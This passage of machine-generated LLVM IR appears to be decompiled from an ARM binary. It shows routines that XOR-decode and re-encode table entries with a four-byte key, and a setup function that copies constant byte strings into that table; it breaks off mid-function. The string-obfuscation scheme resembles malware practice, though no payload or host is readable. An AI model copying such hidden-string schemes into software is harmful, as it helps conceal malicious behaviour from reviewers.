  %v4_10b4c = load i8, i8* %v3_10b4c, align 1
  %v5_10b4c = zext i8 %v4_10b4c to i32
  store i32 %v5_10b4c, i32* @r2, align 4
  %v2_10b50 = add i32 %v3_10b40, add (i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32 4)
  %v3_10b50 = inttoptr i32 %v2_10b50 to i8*
  %v4_10b50 = load i8, i8* %v3_10b50, align 4
  %v5_10b50 = zext i8 %v4_10b50 to i32
  %v3_10b54 = inttoptr i32 %v2_10b44 to i32*
  %v4_10b54 = load i32, i32* %v3_10b54, align 4
  %v5_10b58 = mul nuw nsw i32 %v5_10b4c, 256
  %v6_10b58 = or i32 %v5_10b50, %v5_10b58
  store i32 %v6_10b58, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_10b54714 = phi i32 [ %v4_10b5412, %.thread ], [ %v4_10b54, %bb ]
  ret i32 %v4_10b54714

; uselistorder directives
  uselistorder i32 %v2_10b44, { 1, 0 }
  uselistorder i32 %v3_10b40, { 2, 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_10b68(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b68:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10b68 = mul i32 %arg1, 8
  %v3_10b6c = load i32, i32* @r4, align 4
  store i32 %v3_10b6c, i32* %stack_var_-20, align 4
  %v3_10b7c = and i32 %v3_10b68, 2040
  %v2_10b80 = add i32 %v3_10b7c, ptrtoint (i32* @global_var_1cb48.213 to i32)
  store i32 %v2_10b80, i32* @lr, align 4
  %v1_10b88 = add i32 %v3_10b7c, add (i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32 4)
  store i32 %v1_10b88, i32* %r7.global-to-local, align 4
  %v2_10b8c = load i32, i32* @global_var_1c918.216, align 4
  store i32 %v2_10b8c, i32* @r2, align 4
  %v2_10b90 = inttoptr i32 %v1_10b88 to i8*
  %v3_10b90 = load i8, i8* %v2_10b90, align 4
  %v4_10b90 = zext i8 %v3_10b90 to i32
  %v1_10b94 = add i32 %v3_10b7c, add (i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32 5)
  %v2_10b94 = inttoptr i32 %v1_10b94 to i8*
  %v3_10b94 = load i8, i8* %v2_10b94, align 1
  %v4_10b94 = zext i8 %v3_10b94 to i32
  %v3_10b98 = udiv i32 %v2_10b8c, 256
  %v4_10b9c = mul nuw nsw i32 %v4_10b94, 256
  %v5_10b9c = or i32 %v4_10b9c, %v4_10b90
  %v7_10b9c = icmp eq i32 %v5_10b9c, 0
  %v3_10ba0 = udiv i32 %v2_10b8c, 65536
  %v1_10ba4 = urem i32 %v3_10b98, 256
  store i32 %v1_10ba4, i32* %r6.global-to-local, align 4
  %v1_10ba8 = urem i32 %v3_10ba0, 256
  store i32 %v1_10ba8, i32* %r5.global-to-local, align 4
  %v3_10bac = udiv i32 %v2_10b8c, 16777216
  store i32 %v3_10bac, i32* %r4.global-to-local, align 4
  %v1_10bb0 = urem i32 %v2_10b8c, 256
  br i1 %v7_10b9c, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_10b68
  store i32 %v3_10b6c, i32* @r4, align 4
  ret i32 %v1_10bb0

bb8:                                              ; preds = %dec_label_pc_10b68
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bbc, %bb8
  %v2_10bc8 = phi i32 [ %v1_10c04, %dec_label_pc_10bbc ], [ 0, %bb8 ]
  %v0_10bbc = phi i32 [ %v0_10bfc, %dec_label_pc_10bbc ], [ %v2_10b80, %bb8 ]
  %v1_10bbc = inttoptr i32 %v0_10bbc to i32*
  %v2_10bbc = load i32, i32* %v1_10bbc, align 4
  %v2_10bc0 = add i32 %v2_10bbc, %v2_10bc8
  %v3_10bc0 = inttoptr i32 %v2_10bc0 to i8*
  %v4_10bc0 = load i8, i8* %v3_10bc0, align 1
  %v6_10bc0 = zext i8 %v4_10bc0 to i32
  %v2_10bc4 = xor i32 %v6_10bc0, %v1_10bb0
  %v1_10bc8 = trunc i32 %v2_10bc4 to i8
  store i8 %v1_10bc8, i8* %v3_10bc0, align 1
  %v0_10bcc = load i32, i32* @lr, align 4
  %v1_10bcc = inttoptr i32 %v0_10bcc to i32*
  %v2_10bcc = load i32, i32* %v1_10bcc, align 4
  %v0_10bd0 = load i32, i32* %ip.global-to-local, align 4
  %v2_10bd0 = add i32 %v0_10bd0, %v2_10bcc
  %v3_10bd0 = inttoptr i32 %v2_10bd0 to i8*
  %v4_10bd0 = load i8, i8* %v3_10bd0, align 1
  %v6_10bd0 = zext i8 %v4_10bd0 to i32
  %v0_10bd4 = load i32, i32* %r6.global-to-local, align 4
  %v2_10bd4 = xor i32 %v0_10bd4, %v6_10bd0
  %v1_10bd8 = trunc i32 %v2_10bd4 to i8
  store i8 %v1_10bd8, i8* %v3_10bd0, align 1
  %v0_10bdc = load i32, i32* @lr, align 4
  %v1_10bdc = inttoptr i32 %v0_10bdc to i32*
  %v2_10bdc = load i32, i32* %v1_10bdc, align 4
  %v0_10be0 = load i32, i32* %ip.global-to-local, align 4
  %v2_10be0 = add i32 %v0_10be0, %v2_10bdc
  %v3_10be0 = inttoptr i32 %v2_10be0 to i8*
  %v4_10be0 = load i8, i8* %v3_10be0, align 1
  %v6_10be0 = zext i8 %v4_10be0 to i32
  %v0_10be4 = load i32, i32* %r5.global-to-local, align 4
  %v2_10be4 = xor i32 %v0_10be4, %v6_10be0
  %v1_10be8 = trunc i32 %v2_10be4 to i8
  store i8 %v1_10be8, i8* %v3_10be0, align 1
  %v0_10bec = load i32, i32* @lr, align 4
  %v1_10bec = inttoptr i32 %v0_10bec to i32*
  %v2_10bec = load i32, i32* %v1_10bec, align 4
  %v0_10bf0 = load i32, i32* %ip.global-to-local, align 4
  %v2_10bf0 = add i32 %v0_10bf0, %v2_10bec
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i8*
  %v4_10bf0 = load i8, i8* %v3_10bf0, align 1
  %v6_10bf0 = zext i8 %v4_10bf0 to i32
  %v0_10bf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_10bf4 = xor i32 %v0_10bf4, %v6_10bf0
  %v1_10bf8 = trunc i32 %v2_10bf4 to i8
  store i8 %v1_10bf8, i8* %v3_10bf0, align 1
  %v0_10bfc = load i32, i32* @lr, align 4
  %v1_10bfc = add i32 %v0_10bfc, 4
  %v2_10bfc = inttoptr i32 %v1_10bfc to i8*
  %v3_10bfc = load i8, i8* %v2_10bfc, align 1
  %v4_10bfc = zext i8 %v3_10bfc to i32
  %v0_10c00 = load i32, i32* %r7.global-to-local, align 4
  %v1_10c00 = add i32 %v0_10c00, 1
  %v2_10c00 = inttoptr i32 %v1_10c00 to i8*
  %v3_10c00 = load i8, i8* %v2_10c00, align 1
  %v4_10c00 = zext i8 %v3_10c00 to i32
  %v0_10c04 = load i32, i32* %ip.global-to-local, align 4
  %v1_10c04 = add i32 %v0_10c04, 1
  store i32 %v1_10c04, i32* %ip.global-to-local, align 4
  %v4_10c08 = mul nuw nsw i32 %v4_10c00, 256
  %v5_10c08 = or i32 %v4_10c08, %v4_10bfc
  store i32 %v5_10c08, i32* @r2, align 4
  %v8_10c10 = icmp sgt i32 %v5_10c08, %v1_10c04
  br i1 %v8_10c10, label %dec_label_pc_10bbc, label %dec_label_pc_10c14

dec_label_pc_10c14:                               ; preds = %dec_label_pc_10bbc
  %v2_10c14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10c14, i32* @r4, align 4
  ret i32 %v1_10bb0

; uselistorder directives
  uselistorder i32 %v1_10c04, { 1, 2, 0 }
  uselistorder i32 %v0_10bfc, { 1, 0 }
  uselistorder i32 %v1_10bb0, { 0, 2, 1 }
  uselistorder i32 %v2_10b8c, { 3, 0, 1, 2, 4 }
}

define i32 @function_10c20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c20:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10c20 = mul i32 %arg1, 8
  %v3_10c24 = load i32, i32* @r4, align 4
  store i32 %v3_10c24, i32* %stack_var_-20, align 4
  %v3_10c34 = and i32 %v3_10c20, 2040
  %v2_10c38 = add i32 %v3_10c34, ptrtoint (i32* @global_var_1cb48.213 to i32)
  store i32 %v2_10c38, i32* @lr, align 4
  %v1_10c40 = add i32 %v3_10c34, add (i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32 4)
  store i32 %v1_10c40, i32* %r7.global-to-local, align 4
  %v2_10c44 = load i32, i32* @global_var_1c918.216, align 4
  store i32 %v2_10c44, i32* @r2, align 4
  %v2_10c48 = inttoptr i32 %v1_10c40 to i8*
  %v3_10c48 = load i8, i8* %v2_10c48, align 4
  %v4_10c48 = zext i8 %v3_10c48 to i32
  %v1_10c4c = add i32 %v3_10c34, add (i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32 5)
  %v2_10c4c = inttoptr i32 %v1_10c4c to i8*
  %v3_10c4c = load i8, i8* %v2_10c4c, align 1
  %v4_10c4c = zext i8 %v3_10c4c to i32
  %v3_10c50 = udiv i32 %v2_10c44, 256
  %v4_10c54 = mul nuw nsw i32 %v4_10c4c, 256
  %v5_10c54 = or i32 %v4_10c54, %v4_10c48
  %v7_10c54 = icmp eq i32 %v5_10c54, 0
  %v3_10c58 = udiv i32 %v2_10c44, 65536
  %v1_10c5c = urem i32 %v3_10c50, 256
  store i32 %v1_10c5c, i32* %r6.global-to-local, align 4
  %v1_10c60 = urem i32 %v3_10c58, 256
  store i32 %v1_10c60, i32* %r5.global-to-local, align 4
  %v3_10c64 = udiv i32 %v2_10c44, 16777216
  store i32 %v3_10c64, i32* %r4.global-to-local, align 4
  %v1_10c68 = urem i32 %v2_10c44, 256
  br i1 %v7_10c54, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_10c20
  store i32 %v3_10c24, i32* @r4, align 4
  ret i32 %v1_10c68

bb8:                                              ; preds = %dec_label_pc_10c20
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c74, %bb8
  %v2_10c80 = phi i32 [ %v1_10cbc, %dec_label_pc_10c74 ], [ 0, %bb8 ]
  %v0_10c74 = phi i32 [ %v0_10cb4, %dec_label_pc_10c74 ], [ %v2_10c38, %bb8 ]
  %v1_10c74 = inttoptr i32 %v0_10c74 to i32*
  %v2_10c74 = load i32, i32* %v1_10c74, align 4
  %v2_10c78 = add i32 %v2_10c74, %v2_10c80
  %v3_10c78 = inttoptr i32 %v2_10c78 to i8*
  %v4_10c78 = load i8, i8* %v3_10c78, align 1
  %v6_10c78 = zext i8 %v4_10c78 to i32
  %v2_10c7c = xor i32 %v6_10c78, %v1_10c68
  %v1_10c80 = trunc i32 %v2_10c7c to i8
  store i8 %v1_10c80, i8* %v3_10c78, align 1
  %v0_10c84 = load i32, i32* @lr, align 4
  %v1_10c84 = inttoptr i32 %v0_10c84 to i32*
  %v2_10c84 = load i32, i32* %v1_10c84, align 4
  %v0_10c88 = load i32, i32* %ip.global-to-local, align 4
  %v2_10c88 = add i32 %v0_10c88, %v2_10c84
  %v3_10c88 = inttoptr i32 %v2_10c88 to i8*
  %v4_10c88 = load i8, i8* %v3_10c88, align 1
  %v6_10c88 = zext i8 %v4_10c88 to i32
  %v0_10c8c = load i32, i32* %r6.global-to-local, align 4
  %v2_10c8c = xor i32 %v0_10c8c, %v6_10c88
  %v1_10c90 = trunc i32 %v2_10c8c to i8
  store i8 %v1_10c90, i8* %v3_10c88, align 1
  %v0_10c94 = load i32, i32* @lr, align 4
  %v1_10c94 = inttoptr i32 %v0_10c94 to i32*
  %v2_10c94 = load i32, i32* %v1_10c94, align 4
  %v0_10c98 = load i32, i32* %ip.global-to-local, align 4
  %v2_10c98 = add i32 %v0_10c98, %v2_10c94
  %v3_10c98 = inttoptr i32 %v2_10c98 to i8*
  %v4_10c98 = load i8, i8* %v3_10c98, align 1
  %v6_10c98 = zext i8 %v4_10c98 to i32
  %v0_10c9c = load i32, i32* %r5.global-to-local, align 4
  %v2_10c9c = xor i32 %v0_10c9c, %v6_10c98
  %v1_10ca0 = trunc i32 %v2_10c9c to i8
  store i8 %v1_10ca0, i8* %v3_10c98, align 1
  %v0_10ca4 = load i32, i32* @lr, align 4
  %v1_10ca4 = inttoptr i32 %v0_10ca4 to i32*
  %v2_10ca4 = load i32, i32* %v1_10ca4, align 4
  %v0_10ca8 = load i32, i32* %ip.global-to-local, align 4
  %v2_10ca8 = add i32 %v0_10ca8, %v2_10ca4
  %v3_10ca8 = inttoptr i32 %v2_10ca8 to i8*
  %v4_10ca8 = load i8, i8* %v3_10ca8, align 1
  %v6_10ca8 = zext i8 %v4_10ca8 to i32
  %v0_10cac = load i32, i32* %r4.global-to-local, align 4
  %v2_10cac = xor i32 %v0_10cac, %v6_10ca8
  %v1_10cb0 = trunc i32 %v2_10cac to i8
  store i8 %v1_10cb0, i8* %v3_10ca8, align 1
  %v0_10cb4 = load i32, i32* @lr, align 4
  %v1_10cb4 = add i32 %v0_10cb4, 4
  %v2_10cb4 = inttoptr i32 %v1_10cb4 to i8*
  %v3_10cb4 = load i8, i8* %v2_10cb4, align 1
  %v4_10cb4 = zext i8 %v3_10cb4 to i32
  %v0_10cb8 = load i32, i32* %r7.global-to-local, align 4
  %v1_10cb8 = add i32 %v0_10cb8, 1
  %v2_10cb8 = inttoptr i32 %v1_10cb8 to i8*
  %v3_10cb8 = load i8, i8* %v2_10cb8, align 1
  %v4_10cb8 = zext i8 %v3_10cb8 to i32
  %v0_10cbc = load i32, i32* %ip.global-to-local, align 4
  %v1_10cbc = add i32 %v0_10cbc, 1
  store i32 %v1_10cbc, i32* %ip.global-to-local, align 4
  %v4_10cc0 = mul nuw nsw i32 %v4_10cb8, 256
  %v5_10cc0 = or i32 %v4_10cc0, %v4_10cb4
  store i32 %v5_10cc0, i32* @r2, align 4
  %v8_10cc8 = icmp sgt i32 %v5_10cc0, %v1_10cbc
  br i1 %v8_10cc8, label %dec_label_pc_10c74, label %dec_label_pc_10ccc

dec_label_pc_10ccc:                               ; preds = %dec_label_pc_10c74
  %v2_10ccc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10ccc, i32* @r4, align 4
  ret i32 %v1_10c68

; uselistorder directives
  uselistorder i32 %v1_10cbc, { 1, 2, 0 }
  uselistorder i32 %v0_10cb4, { 1, 0 }
  uselistorder i32 %v1_10c68, { 0, 2, 1 }
  uselistorder i32 %v2_10c44, { 3, 0, 1, 2, 4 }
}

define i32 @function_10cd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10cd8:
  %fp.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10cd8 = load i32, i32* @r4, align 4
  store i32 %v3_10cd8, i32* %stack_var_-36, align 4
  %v6_10cd8 = load i32, i32* @r5, align 4
  %v9_10cd8 = load i32, i32* @r6, align 4
  %v12_10cd8 = load i32, i32* @r7, align 4
  %v1_10ce0 = call i32 @function_12578(i32 2)
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v1_10ce0, i32* @r7, align 4
  %v4_10cfc = call i32 @function_11268(i32 %v1_10ce0, i32 ptrtoint ([3 x i8]* @global_var_14434.221 to i32), i32 2)
  %v0_10d00 = load i32, i32* @r5, align 4
  %v0_10d04 = load i32, i32* @r7, align 4
  store i32 %v0_10d04, i32* @global_var_1cb50.222, align 4
  %v1_10d08 = trunc i32 %v0_10d00 to i8
  store i8 %v1_10d08, i8* bitcast (i32* @global_var_1cb54.223 to i8*), align 4
  %v0_10d0c = load i32, i32* @r6, align 4
  %v1_10d0c = trunc i32 %v0_10d0c to i8
  store i8 %v1_10d0c, i8* bitcast (i32* @global_var_1cb55.224 to i8*), align 4
  %v1_10d10 = call i32 @function_12578(i32 %v0_10d00)
  %v0_10d14 = load i32, i32* @r5, align 4
  store i32 %v1_10d10, i32* @r7, align 4
  %v3_10d20 = call i32 @function_11268(i32 %v1_10d10, i32 ptrtoint (i32* @global_var_14438.226 to i32), i32 %v0_10d14)
  %v0_10d28 = load i32, i32* @r7, align 4
  store i32 %v0_10d28, i32* @global_var_1cb58.227, align 4
  %v0_10d2c = load i32, i32* @r5, align 4
  %v1_10d2c = trunc i32 %v0_10d2c to i8
  store i8 %v1_10d2c, i8* bitcast (i32* @global_var_1cb5c.228 to i8*), align 4
  %v0_10d30 = load i32, i32* @r6, align 4
  %v1_10d30 = trunc i32 %v0_10d30 to i8
  store i8 %v1_10d30, i8* bitcast (i32* @global_var_1cb5d.229 to i8*), align 4
  %v1_10d34 = call i32 @function_12578(i32 29)
  store i32 %v1_10d34, i32* @r5, align 4
  %v3_10d44 = call i32 @function_11268(i32 %v1_10d34, i32 ptrtoint (i32* @global_var_145a0.231 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1cb64.232 to i8*), align 4
  %v0_10d54 = load i32, i32* @r5, align 4
  store i32 %v0_10d54, i32* @global_var_1cb60.233, align 4
  %v0_10d58 = load i32, i32* @r6, align 4
  %v1_10d58 = trunc i32 %v0_10d58 to i8
  store i8 %v1_10d58, i8* bitcast (i32* @global_var_1cb65.234 to i8*), align 4
  %v1_10d5c = call i32 @function_12578(i32 6)
  store i32 6, i32* %fp.global-to-local, align 4
  store i32 %v1_10d5c, i32* @r5, align 4
  %v4_10d70 = call i32 @function_11268(i32 %v1_10d5c, i32 ptrtoint ([7 x i8]* @global_var_1443c.236 to i32), i32 6)
  %v0_10d78 = load i32, i32* @r5, align 4
  store i32 %v0_10d78, i32* @global_var_1cb68.237, align 4
  store i8 6, i8* bitcast (i32* @global_var_1cb6c.238 to i8*), align 4
  %v0_10d80 = load i32, i32* @r6, align 4
  %v1_10d80 = trunc i32 %v0_10d80 to i8
  store i8 %v1_10d80, i8* bitcast (i32* @global_var_1cb6d.239 to i8*), align 4
  %v1_10d84 = call i32 @function_12578(i32 7)
  store i32 7, i32* %r8.global-to-local, align 4
  store i32 %v1_10d84, i32* @r5, align 4
  %v4_10d98 = call i32 @function_11268(i32 %v1_10d84, i32 ptrtoint ([8 x i8]* @global_var_14444.241 to i32), i32 7)
  %v0_10da0 = load i32, i32* @r5, align 4
  store i32 %v0_10da0, i32* @global_var_1cb70.242, align 4
  store i8 7, i8* bitcast (i32* @global_var_1cb74.243 to i8*), align 4
  %v0_10da8 = load i32, i32* @r6, align 4
  %v1_10da8 = trunc i32 %v0_10da8 to i8
  store i8 %v1_10da8, i8* bitcast (i32* @global_var_1cb75.244 to i8*), align 4
  %v1_10dac = call i32 @function_12578(i32 7)
  %v0_10db4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_10dac, i32* @r5, align 4
  %v4_10dbc = call i32 @function_11268(i32 %v1_10dac, i32 ptrtoint ([8 x i8]* @global_var_1444c.246 to i32), i32 %v0_10db4)
  %v0_10dc4 = load i32, i32* @r5, align 4
  store i32 %v0_10dc4, i32* @global_var_1cb78.247, align 4
  %v1_10dc8 = trunc i32 %v0_10db4 to i8
  store i8 %v1_10dc8, i8* bitcast (i32* @global_var_1cb7c.248 to i8*), align 4
  %v0_10dcc = load i32, i32* @r6, align 4
  %v1_10dcc = trunc i32 %v0_10dcc to i8
  store i8 %v1_10dcc, i8* bitcast (i32* @global_var_1cb7d.249 to i8*), align 4
  %v1_10dd0 = call i32 @function_12578(i32 3)
  store i32 %v1_10dd0, i32* @r5, align 4
  %v4_10de0 = call i32 @function_11268(i32 %v1_10dd0, i32 ptrtoint ([4 x i8]* @global_var_14454.251 to i32), i32 3)
  store i8 3, i8* bitcast (i32* @global_var_1cb84.252 to i8*), align 4
  %v0_10df0 = load i32, i32* @r5, align 4
  store i32 %v0_10df0, i32* @global_var_1cb80.253, align 4
  %v0_10df4 = load i32, i32* @r6, align 4
  %v1_10df4 = trunc i32 %v0_10df4 to i8
  store i8 %v1_10df4, i8* bitcast (i32* @global_var_1cb85.254 to i8*), align 4
  %v1_10df8 = call i32 @function_12578(i32 19)
  store i32 %v1_10df8, i32* @r5, align 4
  %v3_10e08 = call i32 @function_11268(i32 %v1_10df8, i32 ptrtoint (i32* @global_var_14458.256 to i32), i32 19)
  store i8 19, i8* bitcast (i32* @global_var_1cb8c.257 to i8*), align 4
  %v0_10e18 = load i32, i32* @r5, align 4
  store i32 %v0_10e18, i32* @global_var_1cb88.258, align 4
  %v0_10e1c = load i32, i32* @r6, align 4
  %v1_10e1c = trunc i32 %v0_10e1c to i8
  store i8 %v1_10e1c, i8* bitcast (i32* @global_var_1cb8d.259 to i8*), align 4
  %v1_10e20 = call i32 @function_12578(i32 24)
  store i32 %v1_10e20, i32* @r5, align 4
  %v3_10e30 = call i32 @function_11268(i32 %v1_10e20, i32 ptrtoint (i32* @global_var_1446c.261 to i32), i32 24)
  store i8 24, i8* bitcast (i32* @global_var_1cb94.262 to i8*), align 4
  %v0_10e40 = load i32, i32* @r5, align 4
  store i32 %v0_10e40, i32* @global_var_1cb90.263, align 4
  %v0_10e44 = load i32, i32* @r6, align 4
  %v1_10e44 = trunc i32 %v0_10e44 to i8
  store i8 %v1_10e44, i8* bitcast (i32* @global_var_1cb95.264 to i8*), align 4
  %v1_10e48 = call i32 @function_12578(i32 9)
  store i32 %v1_10e48, i32* @r5, align 4
  %v4_10e58 = call i32 @function_11268(i32 %v1_10e48, i32 ptrtoint ([10 x i8]* @global_var_14488.266 to i32), i32 9)
  store i8 9, i8* bitcast (i32* @global_var_1cb9c.267 to i8*), align 4
  %v0_10e68 = load i32, i32* @r5, align 4
  store i32 %v0_10e68, i32* @global_var_1cb98.268, align 4
  %v0_10e6c = load i32, i32* @r6, align 4
  %v1_10e6c = trunc i32 %v0_10e6c to i8
  store i8 %v1_10e6c, i8* bitcast (i32* @global_var_1cb9d.269 to i8*), align 4
  %v1_10e70 = call i32 @function_12578(i32 16)
  store i32 %v1_10e70, i32* @r5, align 4
  store i32 16, i32* %sb.global-to-local, align 4
  %v4_10e84 = call i32 @function_11268(i32 %v1_10e70, i32 ptrtoint ([17 x i8]* @global_var_14494.271 to i32), i32 16)
  %v0_10e8c = load i32, i32* @r5, align 4
  store i32 %v0_10e8c, i32* @global_var_1cba0.272, align 4
  store i8 16, i8* bitcast (i32* @global_var_1cba4.273 to i8*), align 4
  %v0_10e94 = load i32, i32* @r6, align 4
  %v1_10e94 = trunc i32 %v0_10e94 to i8
  store i8 %v1_10e94, i8* bitcast (i32* @global_var_1cba5.274 to i8*), align 4
  %v1_10e98 = call i32 @function_12578(i32 22)
  store i32 %v1_10e98, i32* @r5, align 4
  %v4_10ea8 = call i32 @function_11268(i32 %v1_10e98, i32 ptrtoint ([23 x i8]* @global_var_144a8.276 to i32), i32 22)
  %v0_10eb0 = load i32, i32* %r8.global-to-local, align 4
  store i8 22, i8* bitcast (i32* @global_var_1cbac.277 to i8*), align 4
  %v0_10eb8 = load i32, i32* @r5, align 4
  store i32 %v0_10eb8, i32* @global_var_1cba8.278, align 4
  %v0_10ebc = load i32, i32* @r6, align 4
  %v1_10ebc = trunc i32 %v0_10ebc to i8
  store i8 %v1_10ebc, i8* bitcast (i32* @global_var_1cbad.279 to i8*), align 4
  %v1_10ec0 = call i32 @function_12578(i32 %v0_10eb0)
  %v0_10ec8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_10ec0, i32* @r5, align 4
  %v4_10ed0 = call i32 @function_11268(i32 %v1_10ec0, i32 ptrtoint ([8 x i8]* @global_var_144c0.281 to i32), i32 %v0_10ec8)
  %v0_10ed8 = load i32, i32* @r5, align 4
  store i32 %v0_10ed8, i32* @global_var_1cbb0.282, align 4
  %v1_10edc = trunc i32 %v0_10ec8 to i8
  store i8 %v1_10edc, i8* bitcast (i32* @global_var_1cbb4.283 to i8*), align 4
  %v0_10ee0 = load i32, i32* @r6, align 4
  %v1_10ee0 = trunc i32 %v0_10ee0 to i8
  store i8 %v1_10ee0, i8* bitcast (i32* @global_var_1cbb5.284 to i8*), align 4
  %v1_10ee4 = call i32 @function_12578(i32 5)
  store i32 %v1_10ee4, i32* @r5, align 4
  %v4_10ef4 = call i32 @function_11268(i32 %v1_10ee4, i32 ptrtoint ([6 x i8]* @global_var_144c8.286 to i32), i32 5)
  store i8 5, i8* bitcast (i32* @global_var_1cbbc.287 to i8*), align 4
  %v0_10f04 = load i32, i32* @r5, align 4
  store i32 %v0_10f04, i32* @global_var_1cbb8.288, align 4
  %v0_10f08 = load i32, i32* @r6, align 4
  %v1_10f08 = trunc i32 %v0_10f08 to i8
  store i8 %v1_10f08, i8* bitcast (i32* @global_var_1cbbd.289 to i8*), align 4
  %v1_10f0c = call i32 @function_12578(i32 4)
  store i32 %v1_10f0c, i32* @r5, align 4
  %v4_10f1c = call i32 @function_11268(i32 %v1_10f0c, i32 ptrtoint ([5 x i8]* @global_var_144d0.291 to i32), i32 4)
  %v0_10f24 = load i32, i32* %fp.global-to-local, align 4
  store i8 4, i8* bitcast (i32* @global_var_1cbc4.292 to i8*), align 4
  %v0_10f2c = load i32, i32* @r5, align 4
  store i32 %v0_10f2c, i32* @global_var_1cbc0.293, align 4
  %v0_10f30 = load i32, i32* @r6, align 4
  %v1_10f30 = trunc i32 %v0_10f30 to i8
  store i8 %v1_10f30, i8* bitcast (i32* @global_var_1cbc5.294 to i8*), align 4
  %v1_10f34 = call i32 @function_12578(i32 %v0_10f24)
  %v0_10f3c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_10f34, i32* @r5, align 4
  %v4_10f44 = call i32 @function_11268(i32 %v1_10f34, i32 ptrtoint ([7 x i8]* @global_var_144d8.296 to i32), i32 %v0_10f3c)
  %v0_10f4c = load i32, i32* @r5, align 4
  store i32 %v0_10f4c, i32* @global_var_1cbc8.297, align 4
  %v1_10f50 = trunc i32 %v0_10f3c to i8
  store i8 %v1_10f50, i8* bitcast (i32* @global_var_1cbcc.298 to i8*), align 4
  %v0_10f54 = load i32, i32* @r6, align 4
  %v1_10f54 = trunc i32 %v0_10f54 to i8
  store i8 %v1_10f54, i8* bitcast (i32* @global_var_1cbcd.299 to i8*), align 4
  %v1_10f58 = call i32 @function_12578(i32 14)
  store i32 %v1_10f58, i32* @r5, align 4
  store i32 14, i32* %sl.global-to-local, align 4
  %v4_10f6c = call i32 @function_11268(i32 %v1_10f58, i32 ptrtoint ([15 x i8]* @global_var_144e0.301 to i32), i32 14)
  %v0_10f74 = load i32, i32* @r5, align 4
  store i32 %v0_10f74, i32* @global_var_1cbd0.302, align 4
  store i8 14, i8* bitcast (i32* @global_var_1cbd4.303 to i8*), align 4
  %v0_10f7c = load i32, i32* @r6, align 4
  %v1_10f7c = trunc i32 %v0_10f7c to i8
  store i8 %v1_10f7c, i8* bitcast (i32* @global_var_1cbd5.304 to i8*), align 4
  %v1_10f80 = call i32 @function_12578(i32 8)
  store i32 8, i32* @r7, align 4
  store i32 %v1_10f80, i32* @r5, align 4
  %v4_10f94 = call i32 @function_11268(i32 %v1_10f80, i32 ptrtoint ([9 x i8]* @global_var_144f0.306 to i32), i32 8)
  %v0_10f98 = load i32, i32* %r8.global-to-local, align 4
  %v0_10f9c = load i32, i32* @r5, align 4
  store i32 %v0_10f9c, i32* @global_var_1cc30.307, align 4
  %v0_10fa0 = load i32, i32* @r7, align 4
  %v1_10fa0 = trunc i32 %v0_10fa0 to i8
  store i8 %v1_10fa0, i8* bitcast (i32* @global_var_1cc34.308 to i8*), align 4
  %v0_10fa4 = load i32, i32* @r6, align 4
  %v1_10fa4 = trunc i32 %v0_10fa4 to i8
  store i8 %v1_10fa4, i8* bitcast (i32* @global_var_1cc35.309 to i8*), align 4
  %v1_10fa8 = call i32 @function_12578(i32 %v0_10f98)
  %v0_10fb0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_10fa8, i32* @r5, align 4
  %v4_10fb8 = call i32 @function_11268(i32 %v1_10fa8, i32 ptrtoint ([8 x i8]* @global_var_144fc.311 to i32), i32 %v0_10fb0)
  %v0_10fbc = load i32, i32* %sb.global-to-local, align 4
  %v0_10fc0 = load i32, i32* @r5, align 4
  store i32 %v0_10fc0, i32* @global_var_1cc38.312, align 4
  %v1_10fc4 = trunc i32 %v0_10fb0 to i8
  store i8 %v1_10fc4, i8* bitcast (i32* @global_var_1cc3c.313 to i8*), align 4
  %v0_10fc8 = load i32, i32* @r6, align 4
  %v1_10fc8 = trunc i32 %v0_10fc8 to i8
  store i8 %v1_10fc8, i8* bitcast (i32* @global_var_1cc3d.314 to i8*), align 4
  %v1_10fcc = call i32 @function_12578(i32 %v0_10fbc)
  %v0_10fd4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_10fcc, i32* @r5, align 4
  %v4_10fdc = call i32 @function_11268(i32 %v1_10fcc, i32 ptrtoint ([17 x i8]* @global_var_14504.316 to i32), i32 %v0_10fd4)
  %v0_10fe0 = load i32, i32* @r7, align 4
  %v0_10fe4 = load i32, i32* @r5, align 4
